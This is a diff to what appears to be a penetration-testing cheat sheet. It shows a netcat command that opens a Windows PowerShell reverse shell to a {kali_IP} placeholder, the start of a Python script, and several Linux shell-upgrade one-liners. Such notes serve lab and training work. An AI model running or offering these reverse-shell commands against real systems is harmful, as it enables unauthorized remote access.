@@ -64,7 +64,7 @@ Linux reverse shells:
 Windows reverse shell
 - Download/transfer netcat (nc.exe within `/usr/share/windows-resources/binaries/nc.exe`)
 - `C:\Windows\Temp\nc.exe -e powershell.exe {kali_IP} 4444` Powershell reverse shell
-
+- Can also just do it with powershell alone:
 ```
 import base64
 import sys
@@ -98,11 +98,11 @@ Upgrading linux shell:
 
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
-    python3 -c 'import pty; pty.spawn("/bin/bash")'
-    echo 'os.system('/bin/bash')'
-    /bin/sh -i
-    /bin/bash -i
-    perl -e 'exec "/bin/sh";'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+echo 'os.system('/bin/bash')'
+/bin/sh -i
+/bin/bash -i
+perl -e 'exec "/bin/sh";'
     
 ```
 
